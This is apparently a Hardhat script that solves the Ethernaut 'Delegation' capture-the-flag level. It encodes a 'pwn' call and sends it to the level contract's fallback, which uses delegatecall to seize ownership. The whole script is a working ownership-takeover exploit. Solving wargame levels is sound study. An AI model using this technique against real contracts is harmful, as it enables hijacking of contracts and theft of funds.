const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0x0Eda882D9a2e4c589Cf6541162C059Ce0F58f83C";
    contractName = "Delegation";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    console.log(`Level at address ${levelAddress}`);
    // const Attacker = await hre.ethers.getContractFactory("AttackerTelephone");
    // const attacker = await Attacker.deploy(levelAddress);
    // console.log(`Attacker at ${attacker.address}`);

    const abi = require("./contracts_6_Delegation_sol_Delegate.json");
    const iface = new hre.ethers.utils.Interface(abi);
    var data = iface.encodeFunctionData("pwn");
    console.log(data)

    
    gas_price = await hre.ethers.provider.getGasPrice();
    let tx = await account.sendTransaction({
        to: levelAddress,
        gasLimit: "0x100000",
        gasPrice: gas_price,
        data: data
        
    });
    let tr = await tx.wait();

    console.log(await level.owner());

    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
